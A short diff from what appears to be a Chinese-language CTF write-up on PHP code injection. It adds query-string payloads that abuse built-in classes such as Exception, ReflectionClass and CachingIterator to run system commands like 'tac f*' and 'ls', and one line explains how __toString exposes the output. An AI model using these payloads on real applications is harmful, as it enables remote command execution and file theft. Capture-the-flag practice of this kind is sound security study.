@@ -8,4 +8,6 @@ v1=Exception();system('tac f*');//&v2=a
 
 或使用echo是的$v1触发__toString()，此时传递的$v2参数会被输出。
 v1=ReflectionClass&v2=system('tac f*')
+v1=CachingIterator&v2=system(ls)
+v1=Exception&v2=system(ls)
 ```
